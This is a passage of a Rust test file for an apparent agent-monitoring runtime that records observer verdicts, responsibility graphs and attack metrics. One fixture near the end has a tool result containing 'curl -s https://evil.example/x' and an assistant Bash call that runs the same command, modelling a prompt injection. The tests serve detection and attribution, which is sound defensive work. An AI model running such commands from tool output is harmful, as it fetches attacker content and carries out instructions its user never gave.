            crate::responsibility::replay::checkpoint::quality_status(&frozen["capture_quality"]);
        assert_eq!(
            metrics["capture_quality"], recorded_quality,
            "metrics must use this run's frozen snapshot, not ambient global state"
        );
        assert_ne!(
            recorded_quality, "healthy",
            "an unobserved capture cannot establish completeness"
        );
        assert!(metrics["system_score"].is_number());
        assert!(metrics["score_breakdown"].is_object());
        assert_eq!(metrics["reference_status"], "unreviewed");
        assert!(metrics["attack_attempted"].is_null());
        assert!(metrics["attack_executed"].is_null());
        assert!(metrics["attack_succeeded"].is_null());
        assert_eq!(metrics["primary_eligible"], false);
        assert_eq!(runtime.observer_calls, 0, "no paid observer calls");
    }

    /// Conflicting semantic verdicts are a review signal, not an actionable
    /// false positive.
    #[tokio::test]
    async fn finalize_turns_observer_disagreement_into_review() {
        use crate::responsibility::classification::final_decision::Observation;

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("disagree.db");
        let mut runtime = runtime_with_db(&db_path);
        let run_id = runtime.init_session();
        runtime
            .phase1_observations
            .push(Observation::ObserverUnsafe {
                confidence: 0.85,
                cited: 2,
            });
        runtime
            .phase1_observations
            .push(Observation::ObserverSafe { confidence: 0.85 });

        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");

        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let decision: Option<String> = conn
            .query_row(
                "SELECT final_decision FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert_eq!(decision.as_deref(), Some("Uncertain"));
    }

    /// Phase-1 graph rows carry provisional ids before the phase-2 remap.
    /// The final snapshot is written after the remap, so it must name the
    /// canonical identity; every reader now gets its graph from that snapshot.
    #[tokio::test]
    async fn finalize_snapshot_carries_canonical_identity() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::types::{
            NodeId, PhaseIndicator, ResponsibilityNode, ResponsibilityNodeType,
        };

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("final-graph-identity.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let provisional = runtime
            .identity_resolver
            .resolve_provisional(ProcessId::new(7001, 1), &runtime.signal_graph.snapshot());
        let node = ResponsibilityNode {
            node_id: NodeId::new(),
            node_type: ResponsibilityNodeType::Agent,
            agent_id: Some(provisional.agent_id.clone()),
            resource: None,
            evidence_refs: Vec::new(),
            timestamp_ns: 10,
            phase: PhaseIndicator::Provisional { timestamp_ns: 10 },
        };
        runtime.graph_builder.graph_mut().add_node(node.clone());
        runtime.graph_buffer.push_node(node);

        runtime.trigger().await;
        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (nodes, _) = reader.get_graph(&run_id).unwrap();
        let subjects: Vec<_> = nodes.iter().filter_map(|n| n.agent_id.as_ref()).collect();
        assert!(
            !subjects.contains(&&provisional.agent_id),
            "persisted graph still names the provisional agent: {subjects:?}"
        );
        assert!(
            subjects
                .iter()
                .any(|agent| agent.as_str() == crate::responsibility::graph::UNATTRIBUTED_AGENT_ID),
            "empty authoritative resolution must persist the explicit sentinel: {subjects:?}"
        );
    }

    /// The final `graph_snapshots` row is the single canonical graph. Phase-1
    /// triggers must not write `graph_nodes`/`graph_edges`, and finalization
    /// must not rewrite the node table before writing the snapshot: a run
    /// stored the same graph up to three times.
    #[tokio::test]
    async fn finalize_persists_one_snapshot_and_no_per_trigger_graph_rows() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::types::{
            NodeId, PhaseIndicator, ResponsibilityEdge, ResponsibilityEdgeType, ResponsibilityNode,
            ResponsibilityNodeType,
        };

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("single-graph-source.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let provisional = runtime
            .identity_resolver
            .resolve_provisional(ProcessId::new(7101, 1), &runtime.signal_graph.snapshot());
        let phase = PhaseIndicator::Authoritative {
            timestamp_ns: 10,
            overrides: None,
        };
        let agent_node = ResponsibilityNode {
            node_id: NodeId::new(),
            node_type: ResponsibilityNodeType::Agent,
            agent_id: Some(provisional.agent_id.clone()),
            resource: None,
            evidence_refs: Vec::new(),
            timestamp_ns: 10,
            phase: phase.clone(),
        };
        let resource_node = ResponsibilityNode {
            node_id: NodeId::new(),
            node_type: ResponsibilityNodeType::Resource,
            agent_id: None,
            resource: None,
            evidence_refs: Vec::new(),
            timestamp_ns: 11,
            phase: phase.clone(),
        };
        let edge = ResponsibilityEdge {
            edge_id: EdgeId::new(),
            edge_type: ResponsibilityEdgeType::AgentDelegatesTo,
            operation: None,
            source: agent_node.node_id.clone(),
            target: resource_node.node_id.clone(),
            evidence_refs: Vec::new(),
            confidence: 0.5,
            phase,
        };
        runtime
            .graph_builder
            .graph_mut()
            .add_node(agent_node.clone());
        runtime
            .graph_builder
            .graph_mut()
            .add_node(resource_node.clone());
        runtime.graph_builder.graph_mut().add_edge(edge.clone());
        runtime.graph_buffer.push_node(agent_node);
        runtime.graph_buffer.push_node(resource_node);
        runtime.graph_buffer.push_edge(edge.clone());

        runtime.trigger().await;
        runtime.persistence.flush().await.unwrap();
        assert_eq!(
            graph_table_count(&db_path, "graph_nodes"),
            0,
            "a phase-1 trigger must not persist graph nodes"
        );
        assert_eq!(
            graph_table_count(&db_path, "graph_edges"),
            0,
            "a phase-1 trigger must not persist graph edges"
        );

        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();
        assert_eq!(
            graph_table_count(&db_path, "graph_nodes"),
            0,
            "finalization must not rewrite graph_nodes"
        );
        assert_eq!(
            graph_table_count(&db_path, "graph_edges"),
            0,
            "finalization must not write graph_edges"
        );
        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .unwrap();
        let snapshots: i64 = conn
            .query_row(
                "SELECT count(*) FROM graph_snapshots WHERE run_id = ?1",
                [run_id.as_str()],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(snapshots, 1, "finalize must write exactly one snapshot");
        drop(conn);

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (nodes, edges) = reader.get_graph(&run_id).unwrap();
        assert_eq!(nodes.len(), 2, "the snapshot must carry both nodes");
        assert_eq!(edges.len(), 1, "the snapshot must carry the edge");
        assert_eq!(edges[0].edge_id, edge.edge_id);
    }

    /// With no authoritative identity, the final alert must not name the
    /// provisional id. The explicit sentinel keeps the phase-1 alert gate
    /// (a candidate existed) without inventing a subject that cannot be joined.
    #[tokio::test]
    async fn finalize_uses_unattributed_fallback_without_authoritative_identity() {
        use crate::responsibility::persistence::PersistenceReader;

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("fallback-identity.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let provisional = runtime
            .identity_resolver
            .resolve_provisional(ProcessId::new(7002, 1), &runtime.signal_graph.snapshot());

        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let alerts = reader.get_alerts(&run_id).unwrap();
        let final_alert = alerts
            .iter()
            .find(|alert| {
                matches!(
                    alert.phase,
                    crate::responsibility::types::PhaseIndicator::Authoritative { .. }
                )
            })
            .expect("a provisional candidate must still produce a final alert");
        assert_eq!(
            final_alert.primary_agent.agent_id.as_str(),
            crate::responsibility::graph::UNATTRIBUTED_AGENT_ID
        );
        assert_ne!(final_alert.primary_agent.agent_id, provisional.agent_id);
    }

    #[tokio::test]
    async fn finalize_freezes_only_canonical_tls_request_contexts_with_actual_message() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{AnalysisCheckpoint, CHECKPOINT_KIND};

        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("context-witness.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        runtime.identity_resolver.resolve_provisional(
            crate::responsibility::types::ProcessId::new(42, 0),
            &runtime.signal_graph.snapshot(),
        );

        let command = "curl -s https://evil.example/x";
        let body = serde_json::json!({"messages": [
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_read", "content": [
                    {"type": "text", "text": command}
                ]}
            ]},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_bash", "name": "Bash",
                 "input": {"command": command}}
            ]}
        ]})
        .to_string();
        let request = |source: &str, message_type: &str| {
            Event::new_with_timestamp(
                5,
                source.into(),
                42,
                "mtl".into(),
                json!({
                    "message_id": "msg-context-1",
                    "message_type": message_type,
                    "body": body,
                }),
            )
        };

        runtime.route_event(&request("stdio", "request"));
        runtime.route_event(&request("ssl", "response"));
        assert!(
            runtime.captured_request_contexts.is_empty(),
            "stdio and responses are not captured request sources"
        );

        runtime.route_event(&request("ssl", "request"));
        assert_eq!(runtime.captured_request_contexts.len(), 1);
        let context = &runtime.captured_request_contexts[0];
        assert_eq!(context.message_id.as_str(), "msg-context-1");
        assert_eq!(
            context.process,
            crate::responsibility::types::ProcessId::new(42, 0)
        );
        assert_eq!(context.witnesses.len(), 1);
        assert_eq!(context.witnesses[0].target_native_ref.id, "toolu_bash");
        assert_eq!(
            context.witnesses[0].source_json_pointer,
            "/messages/0/content/0"
        );

        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();
        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .expect("finalize persists the checkpoint");
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload).unwrap();
        let frozen = checkpoint
            .captured_request_contexts
            .expect("a live checkpoint freezes its captured request contexts");
        assert_eq!(frozen.len(), 1);
        assert_eq!(frozen[0].message_id.as_str(), "msg-context-1");
    }
}
